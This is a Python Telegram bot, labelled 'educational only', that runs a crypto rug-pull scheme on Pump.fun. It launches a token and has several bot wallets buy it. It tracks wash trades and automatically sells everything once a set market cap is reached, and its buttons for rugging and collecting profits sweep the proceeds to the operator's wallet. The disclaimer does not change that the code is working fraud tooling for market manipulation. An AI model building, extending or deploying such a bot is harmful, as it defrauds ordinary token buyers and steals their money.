#!/usr/bin/env python3
"""
Simple Rug Pull Bot - EDUCATIONAL ONLY
"""

import asyncio
import sys
import os

try:
    import telebot
    from telebot import types
    from config import TELEGRAM_TOKEN, RPC_URL, MAIN_WALLET, RUG_THRESHOLD_MC
    from modules.bundler import RugBundler
    from modules.monitor import HypeMonitor
    from modules.rugger import RugExecutor
    from modules.collector import ProfitCollector
except ImportError as e:
    print(f"\n[ERROR] Import Error: {e}")
    print("\n[INFO] Install dependencies:")
    print("   pip install -r requirements.txt")
    sys.exit(1)
except ValueError as e:
    print(f"\n[ERROR] Configuration Error: {e}")
    print("\n[INFO] Setup Instructions:")
    print("1. Copy env.example to .env")
    print("2. Edit .env and add your credentials")
    print("3. Run: python setup_rpc.py")
    sys.exit(1)

bot = telebot.TeleBot(TELEGRAM_TOKEN)
bundler = RugBundler(RPC_URL)
monitor = HypeMonitor(RPC_URL)
rugger = RugExecutor(RPC_URL)
collector = ProfitCollector(RPC_URL)

# Store active token for quick actions
active_token = {}

# Store launch wizard state
launch_wizard = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Start command with buttons."""
    try:
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("🚀 Launch Token", callback_data="launch_start")
        )
        markup.row(
            types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
            types.InlineKeyboardButton("📊 Status", callback_data="status")
        )
        
        # Add Collect Profits button if MAIN_WALLET is configured
        if MAIN_WALLET and collector.enabled:
            markup.row(
                types.InlineKeyboardButton("💸 Collect Profits", callback_data="collect_profits")
            )
        
        welcome_text = (
            "RUG BOT READY!\n\n"
            "Commands:\n"
            "- Launch Token: Start wizard\n"
            "- Check Wallets: Funding status\n"
            "- Status: Bot status\n"
        )
        
        if MAIN_WALLET and collector.enabled:
            welcome_text += f"- Collect Profits: Send all SOL to main wallet\n"
        
        welcome_text += "\nAll actions available via buttons below!"
        
        bot.reply_to(message, welcome_text, reply_markup=markup)
        print(f"[INFO] /start command processed for chat {message.chat.id}")
    except Exception as e:
        print(f"[ERROR] /start failed: {e}")
        bot.reply_to(message, f"[ERROR] Failed to show buttons: {e}")

@bot.message_handler(commands=['launch'])
def handle_launch(message):
    """Launch token with validation and auto-monitoring."""
    try:
        args = message.text.split(maxsplit=4)[1:]  # Allow description with spaces
        if len(args) < 3:
            bot.reply_to(message, "Usage: /launch <name> <symbol> <image_url> [description]\n\nOr use the Launch Token button for guided wizard!")
            return
        
        name = args[0]
        symbol = args[1]
        image_url = args[2]
        description = args[3] if len(args) >= 4 else "Meme token on Pump.fun"
        
        # Input validation
        if len(name) > 32:
            bot.reply_to(message, "[ERROR] Token name too long (max 32 chars)")
            return
        if len(symbol) > 10:
            bot.reply_to(message, "[ERROR] Symbol too long (max 10 chars)")
            return
        if not image_url.startswith('http'):
            bot.reply_to(message, "[ERROR] Invalid image URL (must start with http)")
            return
        if len(description) > 200:
            bot.reply_to(message, "[ERROR] Description too long (max 200 chars)")
            return
        
        from modules.error_handler import format_error, log_error
        from config import NUM_WALLETS
        
        bot.reply_to(message, f"[LAUNCH] Creating {name} ({symbol})...")
        bot.reply_to(message, f"[INFO] {description}")
        bot.reply_to(message, f"[INFO] {NUM_WALLETS} wallets will buy sequentially (optimized for <$10)")
        
        try:
            mint = asyncio.run(bundler.create_and_bundle(name, symbol, image_url, description))
            
            if mint:
                # Store active token for this chat
                active_token[message.chat.id] = mint
                
                # Create action buttons (use short callbacks, mint stored in active_token)
                markup = types.InlineKeyboardMarkup()
                markup.row(
                    types.InlineKeyboardButton("👀 Monitor", callback_data="monitor_active"),
                    types.InlineKeyboardButton("💣 Rug Now", callback_data="rug_active")
                )
                markup.row(
                    types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
                    types.InlineKeyboardButton("📊 Status", callback_data="status")
                )
                
                success_text = (
                    f"[OK] TOKEN CREATED!\n\n"
                    f"Mint: {mint}\n\n"
                    f"Auto-monitoring: ENABLED\n"
                    f"Quick actions below:"
                )
                
                bot.reply_to(message, success_text, reply_markup=markup)
                print(f"[DEBUG] Sent success message with 4 buttons to chat {message.chat.id}")
                
                # Auto-start monitoring in background thread (non-blocking)
                try:
                    import threading
                    def run_monitor():
                        try:
                            asyncio.run(monitor.start(mint, message.chat.id))
                        except Exception as e:
                            log_error(e, f"Monitor background task for {mint[:8]}")
                            formatted_error = format_error(e, "monitoring")
                            bot.reply_to(message, f"[WARNING] Monitor stopped: {formatted_error}")
                    
                    monitor_thread = threading.Thread(target=run_monitor, daemon=True)
                    monitor_thread.start()
                    print(f"[INFO] Monitoring started in background for {mint[:8]}...")
                except Exception as monitor_error:
                    log_error(monitor_error, "Monitor thread creation")
                    formatted_error = format_error(monitor_error, "monitor setup")
                    bot.reply_to(message, formatted_error)
            else:
                bot.reply_to(message, f"[ERROR] Launch failed\n\nToken creation returned no mint address.\nCheck console logs for details.")
                
        except Exception as launch_error:
            # Log detailed error to console
            log_error(launch_error, f"Token launch: {name} ({symbol})")
            
            # Send user-friendly error to Telegram
            formatted_error = format_error(launch_error, "token launch")
            bot.reply_to(message, formatted_error + "\n\nTip: Check wallet balances and RPC connection")
            
    except ValueError as ve:
        bot.reply_to(message, f"[ERROR] Validation failed: {ve}")
    except Exception as e:
        # Catch outer exceptions
        from modules.error_handler import format_error, log_error
        log_error(e, "/launch command")
        formatted_error = format_error(e, "/launch command")
        bot.reply_to(message, formatted_error)

@bot.message_handler(commands=['monitor'])
def handle_monitor(message):
    """Start monitoring."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /monitor <mint>")
            return
            
        mint = args[0]
        bot.reply_to(message, f"[MONITOR] Started monitoring {mint}")
        
    except Exception as e:
        bot.reply_to(message, f"Monitor failed: {e}")

@bot.message_handler(commands=['rug'])
def handle_rug(message):
    """Manual rug."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /rug <mint>")
            return
            
        mint = args[0]
        success = asyncio.run(rugger.execute(mint))
        
        if success:
            bot.reply_to(message, f"[RUG] RUGGED {mint}")
        else:
            bot.reply_to(message, f"[ERROR] Rug failed for {mint}")
            
    except Exception as e:
        bot.reply_to(message, f"Rug failed: {e}")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """Get bot status."""
    try:
        status = monitor.get_status()
        bot.reply_to(message, f"Bot Status:\nActive tokens: {len(status['active_tokens'])}\nWash trades: {status['wash_count']}")
    except Exception as e:
        bot.reply_to(message, f"Status check failed: {e}")

@bot.message_handler(commands=['wallets'])
def handle_wallets(message):
    """Check wallet funding status."""
    try:
        from solana.rpc.api import Client
        from modules.utils import load_wallets
        import os
        import json
        
        # Import Pubkey
        try:
            from solders.pubkey import Pubkey
        except ImportError:
            from solana.publickey import PublicKey as Pubkey
        
        bot.reply_to(message, "[INFO] Checking wallet funding status...")
        
        # Load wallets
        wallets = load_wallets()
        if not wallets:
            bot.reply_to(message, "[ERROR] No wallets found! Bot will generate them on first launch.")
            return
        
        # Connect to RPC
        client = Client(RPC_URL)
        
        # Check balances
        funded_count = 0
        unfunded_count = 0
        total_balance = 0.0
        
        response_lines = ["WALLET FUNDING STATUS\n" + "="*40 + "\n"]
        
        for i, wallet in enumerate(wallets):
            try:
                # Get wallet address
                try:
                    wallet_addr = str(wallet.pubkey())
                except:
                    wallet_addr = str(wallet.public_key)
                
                # Convert string to Pubkey object
                pubkey_obj = Pubkey.from_string(wallet_addr)
                
                # Get balance
                balance_resp = client.get_balance(pubkey_obj)
                balance_sol = balance_resp.value / 1e9 if balance_resp.value else 0.0
                total_balance += balance_sol
                
                # Determine status (updated for 0.0075 SOL buys)
                if balance_sol >= 0.01:
                    status = "FUNDED"
                    funded_count += 1
                    indicator = "[OK]"
                elif balance_sol > 0:
                    status = "LOW"
                    unfunded_count += 1
                    indicator = "[WARNING]"
                else:
                    status = "EMPTY"
                    unfunded_count += 1
                    indicator = "[EMPTY]"
                
                # Add to response
                response_lines.append(f"{indicator} Wallet {i}: {balance_sol:.4f} SOL")
                response_lines.append(f"   {wallet_addr}")
                response_lines.append(f"   Status: {status}\n")
                
            except Exception as e:
                response_lines.append(f"[ERROR] Wallet {i}: {str(e)[:30]}\n")
        
        # Summary
        response_lines.append("="*40)
        response_lines.append(f"\nSUMMARY:")
        response_lines.append(f"  Total wallets: {len(wallets)}")
        response_lines.append(f"  Funded: {funded_count}")
        response_lines.append(f"  Need funding: {unfunded_count}")
        response_lines.append(f"  Total balance: {total_balance:.4f} SOL")
        
        if unfunded_count > 0:
            needed_sol = unfunded_count * 0.01
            response_lines.append(f"\n[WARNING] ACTION REQUIRED:")
            response_lines.append(f"  Fund {unfunded_count} wallets")
            response_lines.append(f"  Need: {needed_sol:.4f} SOL total")
            response_lines.append(f"  (0.01 SOL per wallet - covers 0.0075 buy + fees)")
        else:
            response_lines.append(f"\n[OK] All wallets funded!")
        
        # Send response (split if too long)
        response = "\n".join(response_lines)
        if len(response) > 4000:
            # Split into chunks
            chunks = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                bot.reply_to(message, chunk)
        else:
            bot.reply_to(message, response)
            
    except Exception as e:
        bot.reply_to(message, f"[ERROR] Wallet check failed: {e}")
        import traceback
        print(f"[ERROR] Wallet check trace: {traceback.format_exc()}")

# Message handler for wizard steps
@bot.message_handler(func=lambda message: message.chat.id in launch_wizard)
def handle_wizard_input(message):
    """Handle wizard step inputs."""
    chat_id = message.chat.id
    
    # Check if message has text (user might send photo/file)
    if not message.text:
        bot.reply_to(message, "[ERROR] Please send text only. Try again:")
        return
    
    state = launch_wizard[chat_id]
    
    if state['step'] == 'name':
        # Validate name
        name = message.text.strip()
        if len(name) > 32:
            bot.reply_to(message, "[ERROR] Name too long! Max 32 characters.\n\nTry again:")
            return
        if len(name) < 1:
            bot.reply_to(message, "[ERROR] Name cannot be empty!\n\nTry again:")
            return
        
        state['name'] = name
        state['step'] = 'symbol'
        
        bot.reply_to(message, f"[OK] Name: {name}\n\nNow enter token SYMBOL (e.g., DOGE, MOON):")
    
    elif state['step'] == 'symbol':
        # Validate symbol
        symbol = message.text.strip().upper()
        if len(symbol) > 10:
            bot.reply_to(message, "[ERROR] Symbol too long! Max 10 characters.\n\nTry again:")
            return
        if len(symbol) < 1:
            bot.reply_to(message, "[ERROR] Symbol cannot be empty!\n\nTry again:")
            return
        
        state['symbol'] = symbol
        state['step'] = 'description'
        
        bot.reply_to(message, f"[OK] Symbol: {symbol}\n\nNow enter token DESCRIPTION (1-200 characters):")
    
    elif state['step'] == 'description':
        # Validate description
        description = message.text.strip()
        if len(description) > 200:
            bot.reply_to(message, "[ERROR] Description too long! Max 200 characters.\n\nTry again:")
            return
        if len(description) < 1:
            bot.reply_to(message, "[ERROR] Description cannot be empty!\n\nTry again:")
            return
        
        state['description'] = description
        state['step'] = 'image'
        
        bot.reply_to(message, f"[OK] Description: {description}\n\nNow enter image URL (must start with http):")
    
    elif state['step'] == 'image':
        # Validate image URL
        image_url = message.text.strip()
        if not image_url.startswith('http'):
            bot.reply_to(message, "[ERROR] Invalid URL! Must start with http or https.\n\nTry again:")
            return
        
        state['image_url'] = image_url
        
        # Show preview and confirmation
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("✅ Launch Now", callback_data="launch_confirm"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="launch_cancel")
        )
        
        preview_text = (
            f"TOKEN PREVIEW\n"
            f"{'='*40}\n\n"
            f"Name: {state['name']}\n"
            f"Symbol: {state['symbol']}\n"
            f"Description: {state['description']}\n"
            f"Image: {image_url}\n\n"
            f"Cost: ~0.053 SOL (~$10.20) Budget-optimized\n"
            f"Wallets: 4 (efficient for quick pumps)\n"
            f"Time: ~1 minute\n\n"
            f"{'='*40}\n"
            f"[WARNING] Confirm to launch!"
        )
        
        bot.reply_to(message, preview_text, reply_markup=markup)

# Callback query handlers for buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Handle all button callbacks."""
    try:
        data = call.data
        chat_id = call.message.chat.id
        
        # Launch wizard start
        if data == "launch_start":
            bot.answer_callback_query(call.id, "Starting launch wizard...")
            
            # Initialize wizard state
            launch_wizard[chat_id] = {
                'step': 'name',
                'name': None,
                'symbol': None,
                'description': None,
                'image_url': None
            }
            
            bot.send_message(
                chat_id,
                "TOKEN LAUNCH WIZARD\n\n"
                "Let's create your token step by step!\n\n"
                "Enter token NAME (e.g., Doge Coin, Moon Token):"
            )
        
        # Launch confirmation
        elif data == "launch_confirm":
            if chat_id not in launch_wizard:
                bot.answer_callback_query(call.id, "[ERROR] Wizard expired, start again")
                return
            
            bot.answer_callback_query(call.id, "Launching...")
            
            state = launch_wizard[chat_id]
            name = state['name']
            symbol = state['symbol']
            description = state['description']
            image_url = state['image_url']
            
            # Clear wizard state
            del launch_wizard[chat_id]
            
            # Launch token
            from config import NUM_WALLETS
            bot.send_message(chat_id, f"[LAUNCH] Creating {name} ({symbol})...")
            bot.send_message(chat_id, f"[INFO] {description}")
            bot.send_message(chat_id, f"[INFO] {NUM_WALLETS} wallets will buy sequentially (optimized for <$10)")
            
            try:
                from modules.error_handler import format_error, log_error
                
                mint = asyncio.run(bundler.create_and_bundle(name, symbol, image_url, description))
                
                if mint:
                    # Store active token
                    active_token[chat_id] = mint
                    
                    # Create action buttons (use short callbacks)
                    markup = types.InlineKeyboardMarkup()
                    markup.row(
                        types.InlineKeyboardButton("👀 Monitor", callback_data="monitor_active"),
                        types.InlineKeyboardButton("💣 Rug Now", callback_data="rug_active")
                    )
                    markup.row(
                        types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
                        types.InlineKeyboardButton("📊 Status", callback_data="status")
                    )
                    
                    success_text = (
                        f"[OK] TOKEN CREATED!\n\n"
                        f"Mint: {mint}\n\n"
                        f"Auto-monitoring: ENABLED\n"
                        f"Quick actions below:"
                    )
                    
                    bot.send_message(chat_id, success_text, reply_markup=markup)
                    print(f"[DEBUG] Sent success message with 4 buttons to chat {chat_id}")
                    
                    # Auto-start monitoring in background thread (non-blocking)
                    try:
                        import threading
                        def run_monitor():
                            try:
                                asyncio.run(monitor.start(mint, chat_id))
                            except Exception as e:
                                log_error(e, f"Monitor background task for {mint[:8]}")
                                formatted_error = format_error(e, "monitoring")
                                bot.send_message(chat_id, f"[WARNING] Monitor stopped: {formatted_error}")
                        
                        monitor_thread = threading.Thread(target=run_monitor, daemon=True)
                        monitor_thread.start()
                        print(f"[INFO] Monitoring started in background for {mint[:8]}...")
                    except Exception as monitor_error:
                        log_error(monitor_error, "Monitor thread creation")
                        formatted_error = format_error(monitor_error, "monitor setup")
                        bot.send_message(chat_id, formatted_error)
                else:
                    bot.send_message(chat_id, f"[ERROR] Launch failed\n\nToken creation returned no mint address.\nCheck console logs for details.")
                    
            except Exception as e:
                # Log detailed error to console
                log_error(e, f"Token launch: {name} ({symbol})")
                
                # Send user-friendly error to Telegram
                formatted_error = format_error(e, "token launch")
                bot.send_message(chat_id, formatted_error + "\n\nTip: Check wallet balances and RPC connection")
        
        # Launch cancel
        elif data == "launch_cancel":
            if chat_id in launch_wizard:
                del launch_wizard[chat_id]
            bot.answer_callback_query(call.id, "Launch cancelled")
            bot.edit_message_text("[CANCELLED] Launch cancelled", chat_id, call.message.message_id)
        
        # Wallets button
        elif data == "wallets":
            bot.answer_callback_query(call.id, "Checking wallets...")
            handle_wallets_check(chat_id)
        
        # Status button
        elif data == "status":
            bot.answer_callback_query(call.id, "Getting status...")
            handle_status_check(chat_id)
        
        # Monitor button
        elif data == "monitor_active":
            if chat_id not in active_token:
                bot.answer_callback_query(call.id, "[ERROR] No active token")
                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
                return
            
            mint = active_token[chat_id]
            bot.answer_callback_query(call.id, f"Monitoring {mint[:8]}...")
            
            # Get monitoring status
            status = monitor.get_status()
            is_monitoring = mint in status['active_tokens']
            
            if is_monitoring:
                # Calculate uptime
                import time
                start_time = monitor.monitoring[mint]['start_time']
                uptime_seconds = int(time.time() - start_time)
                uptime_minutes = uptime_seconds // 60
                
                status_text = (
                    f"[MONITOR] Status for {mint[:16]}...\n\n"
                    f"Status: ACTIVE\n"
                    f"Uptime: {uptime_minutes} minutes\n"
                    f"Wash trades: {status['wash_count']}\n"
                    f"Target MC: ${RUG_THRESHOLD_MC:,.0f}\n\n"
                    f"Bot will auto-rug when target is reached."
                )
            else:
                status_text = (
                    f"[MONITOR] Status for {mint[:16]}...\n\n"
                    f"Status: NOT ACTIVE\n"
                    f"(May have stopped due to error or completion)\n\n"
                    f"Check console logs for details."
                )
            
            bot.send_message(chat_id, status_text)
        
        # Rug button
        elif data == "rug_active":
            if chat_id not in active_token:
                bot.answer_callback_query(call.id, "[ERROR] No active token")
                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
                return
            
            mint = active_token[chat_id]
            bot.answer_callback_query(call.id, "[WARNING] Confirm rug...")
            
            # Confirmation markup
            confirm_markup = types.InlineKeyboardMarkup()
            confirm_markup.row(
                types.InlineKeyboardButton("💥 CONFIRM RUG", callback_data="rug_confirm_active"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
            )
            
            bot.send_message(
                chat_id,
                f"[WARNING] CONFIRM RUG PULL?\n\nMint: {mint[:16]}...\n\nThis will sell all tokens!",
                reply_markup=confirm_markup
            )
        
        # Rug confirmation
        elif data == "rug_confirm_active":
            if chat_id not in active_token:
                bot.answer_callback_query(call.id, "[ERROR] No active token")
                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
                return
            
            mint = active_token[chat_id]
            bot.answer_callback_query(call.id, "Rugging...")
            bot.send_message(chat_id, f"[RUG] Executing for {mint}...")
            
            try:
                from modules.error_handler import format_error, log_error
                
                success = asyncio.run(rugger.execute(mint))
                
                if success:
                    bot.send_message(chat_id, f"[OK] RUG SUCCESSFULLY EXECUTED\n\nMint: {mint}\n\nProfits are in bot wallets.\nUse 'Collect Profits' to send to main wallet.")
                    # Clear active token after rug
                    del active_token[chat_id]
                else:
                    bot.send_message(chat_id, f"[ERROR] Rug execution failed\n\nMint: {mint}\n\nCheck console logs for details.\n\nTip: Verify token has balance to sell")
                    
            except Exception as e:
                # Log detailed error to console
                log_error(e, f"Rug execution for {mint}")
                
                # Send user-friendly error to Telegram
                formatted_error = format_error(e, "rug execution")
                bot.send_message(chat_id, formatted_error + f"\n\nMint: {mint}")
        
        # Collect Profits button
        elif data == "collect_profits":
            if not MAIN_WALLET or not collector.enabled:
                bot.answer_callback_query(call.id, "Collector disabled")
                bot.send_message(chat_id, "[ERROR] MAIN_WALLET not configured in .env")
                return
            
            bot.answer_callback_query(call.id, "Checking balances...")
            
            # Get collection preview (how much will be collected)
            import threading
            from modules.error_handler import format_error, log_error
            
            def show_preview():
                try:
                    preview = asyncio.run(collector.get_collection_preview())
                    
                    if not preview["success"]:
                        bot.send_message(
                            chat_id,
                            f"[ERROR] Preview failed: {preview.get('error', 'Unknown error')}"
                        )
                        return
                    
                    # Check if there's anything to collect
                    if preview["collectible"] == 0:
                        bot.send_message(
                            chat_id,
                            f"[INFO] NO FUNDS TO COLLECT\n\n"
                            f"All {len(preview['details'])} bot wallets are empty or below minimum.\n\n"
                            f"Run a rug first to have profits to collect!"
                        )
                        return
                    
                    # Show confirmation with preview
                    confirm_markup = types.InlineKeyboardMarkup()
                    confirm_markup.row(
                        types.InlineKeyboardButton("✅ CONFIRM COLLECT", callback_data="collect_confirm"),
                        types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
                    )
                    
                    from config import NUM_WALLETS
                    
                    # Build message with FULL address and collectible amount
                    message = (
                        f"[COLLECT] CONFIRM PROFIT COLLECTION?\n\n"
                        f"PREVIEW:\n"
                        f"  Total collectible: {preview['collectible']:.6f} SOL\n"
                        f"  Wallets with funds: {preview['wallets_with_funds']}/{NUM_WALLETS}\n\n"
                        f"DESTINATION (verify carefully):\n"
                        f"{MAIN_WALLET}\n\n"
                        f"[WARNING] This action cannot be undone!\n"
                        f"Double-check the address above matches your wallet."
                    )
                    
                    bot.send_message(chat_id, message, reply_markup=confirm_markup)
                    
                except Exception as e:
                    log_error(e, "Profit collection preview")
                    formatted_error = format_error(e, "preview")
                    bot.send_message(chat_id, formatted_error)
            
            thread = threading.Thread(target=show_preview)
            thread.daemon = True
            thread.start()
        
        # Collect confirmation
        elif data == "collect_confirm":
            if not MAIN_WALLET or not collector.enabled:
                bot.answer_callback_query(call.id, "Collector disabled")
                return
            
            bot.answer_callback_query(call.id, "Collecting...")
            bot.send_message(chat_id, "[COLLECT] Starting profit collection...")
            
            import threading
            from modules.error_handler import format_error, log_error
            
            def run_collect():
                try:
                    result = asyncio.run(collector.collect_all())
                    
                    if result["success"]:
                        total_wallets = result.get('total_wallets', result['transferred'] + result.get('failed', 0))
                        message = (
                            f"[OK] PROFIT COLLECTION COMPLETE!\n\n"
                            f"Transferred: {result['transferred']}/{total_wallets} wallets\n"
                            f"Total collected: {result['collected']:.6f} SOL\n"
                            f"Failed: {result['failed']}\n\n"
                            f"Sent to:\n{MAIN_WALLET}"
                        )
                        
                        # Add details
                        if result.get("details"):
                            message += "\n\nDetails:\n"
                            for detail in result["details"]:
                                if detail["status"] == "success":
                                    message += f"  [OK] Wallet {detail['wallet']}: {detail['amount']:.6f} SOL\n"
                                elif detail["status"] == "skipped":
                                    message += f"  [SKIP] Wallet {detail['wallet']}: {detail['reason']}\n"
                                else:
                                    message += f"  [ERROR] Wallet {detail['wallet']}\n"
                        
                        bot.send_message(chat_id, message)
                    else:
                        # Format error with context
                        error_msg = result.get("error", "Collection failed (no error details)")
                        formatted_error = f"[ERROR] Profit Collection Failed\n\n{error_msg}\n\nTip: Check wallet balances with 'Check Wallets' button"
                        bot.send_message(chat_id, formatted_error)
                        
                except Exception as e:
                    # Log detailed error to console
                    log_error(e, "Profit collection thread")
                    
                    # Send user-friendly error to Telegram
                    formatted_error = format_error(e, "profit collection")
                    bot.send_message(chat_id, formatted_error)
            
            collect_thread = threading.Thread(target=run_collect, daemon=True)
            collect_thread.start()
        
        # Cancel button
        elif data == "cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            bot.edit_message_text("[CANCELLED] Action cancelled", chat_id, call.message.message_id)
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
        print(f"[ERROR] Callback error: {e}")

def handle_wallets_check(chat_id):
    """Handle wallets check from button."""
    try:
        from solana.rpc.api import Client
        from modules.utils import load_wallets
        from modules.error_handler import format_error, log_error
        
        # Import Pubkey
        try:
            from solders.pubkey import Pubkey
        except ImportError:
            from solana.publickey import PublicKey as Pubkey
        
        bot.send_message(chat_id, "[INFO] Checking wallet funding status...")
        
        # Load wallets
        wallets = load_wallets()
        if not wallets:
            bot.send_message(chat_id, "[ERROR] No wallets found! Bot will generate them on first launch.")
            return
        
        # Connect to RPC
        client = Client(RPC_URL)
        
        # Check balances
        funded_count = 0
        unfunded_count = 0
        total_balance = 0.0
        
        response_lines = ["WALLET FUNDING STATUS\n" + "="*40 + "\n"]
        
        for i, wallet in enumerate(wallets):
            try:
                # Get wallet address
                try:
                    wallet_addr = str(wallet.pubkey())
                except:
                    wallet_addr = str(wallet.public_key)
                
                # Convert string to Pubkey object
                pubkey_obj = Pubkey.from_string(wallet_addr)
                
                # Get balance
                balance_resp = client.get_balance(pubkey_obj)
                balance_sol = balance_resp.value / 1e9 if balance_resp.value else 0.0
                total_balance += balance_sol
                
                # Determine status (updated for 0.0075 SOL buys)
                if balance_sol >= 0.01:
                    status = "FUNDED"
                    funded_count += 1
                    indicator = "[OK]"
                elif balance_sol > 0:
                    status = "LOW"
                    unfunded_count += 1
                    indicator = "[WARNING]"
                else:
                    status = "EMPTY"
                    unfunded_count += 1
                    indicator = "[EMPTY]"
                
                # Add to response
                response_lines.append(f"{indicator} Wallet {i}: {balance_sol:.4f} SOL")
                response_lines.append(f"   {wallet_addr}")
                response_lines.append(f"   Status: {status}\n")
                
            except Exception as e:
                response_lines.append(f"[ERROR] Wallet {i}: {str(e)[:30]}\n")
        
        # Summary
        response_lines.append("="*40)
        response_lines.append(f"\nSUMMARY:")
        response_lines.append(f"  Total wallets: {len(wallets)}")
        response_lines.append(f"  Funded: {funded_count}")
        response_lines.append(f"  Need funding: {unfunded_count}")
        response_lines.append(f"  Total balance: {total_balance:.4f} SOL")
        
        if unfunded_count > 0:
            needed_sol = unfunded_count * 0.01
            response_lines.append(f"\n[WARNING] ACTION REQUIRED:")
            response_lines.append(f"  Fund {unfunded_count} wallets")
            response_lines.append(f"  Need: {needed_sol:.4f} SOL total")
            response_lines.append(f"  (0.01 SOL per wallet - covers 0.0075 buy + fees)")
        else:
            response_lines.append(f"\n[OK] All wallets funded!")
        
        # Send response (split if too long)
        response = "\n".join(response_lines)
        if len(response) > 4000:
            # Split into chunks
            chunks = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                bot.send_message(chat_id, chunk)
        else:
            bot.send_message(chat_id, response)
            
    except Exception as e:
        # Log detailed error to console
        log_error(e, "Wallet balance check")
        
        # Send user-friendly error to Telegram
        formatted_error = format_error(e, "wallet check")
        bot.send_message(chat_id, formatted_error)

def handle_status_check(chat_id):
    """Handle status check from button."""
    try:
        from modules.error_handler import format_error, log_error
        
        status = monitor.get_status()
        status_text = (
            f"BOT STATUS\n\n"
            f"Active tokens: {len(status['active_tokens'])}\n"
            f"Wash trades: {status['wash_count']}"
        )
        bot.send_message(chat_id, status_text)
    except Exception as e:
        # Log detailed error to console
        log_error(e, "Status check")
        
        # Send user-friendly error to Telegram
        formatted_error = format_error(e, "status check")
        bot.send_message(chat_id, formatted_error)

if __name__ == "__main__":
    from modules.error_handler import log_error
    
    print("Simple Rug Bot Starting...")
    
    # Start keep-alive web server for 24/7 uptime
    try:
        from keep_alive import keep_alive
        keep_alive()
    except Exception as e:
        print(f"[WARNING] Keep-alive server failed to start: {e}")
        print("[INFO] Bot will still run but may stop on Replit free tier")
    
    # Start bot with comprehensive error handling
    try:
        print("[INFO] Starting Telegram bot polling...")
        bot.polling(none_stop=True, timeout=60)
    except KeyboardInterrupt:
        print("\n[INFO] Bot stopped by user (Ctrl+C)")
        sys.exit(0)
    except Exception as e:
        log_error(e, "Bot polling loop")
        print("\n[CRITICAL] Bot crashed! See error above.")
        print("[INFO] Common causes:")
        print("  - TELEGRAM_TOKEN invalid or expired")
        print("  - Network connection lost")
        print("  - Multiple bot instances running (port conflict)")
        print("\n[INFO] Try restarting with: pkill -9 python && python main.py")
        sys.exit(1)
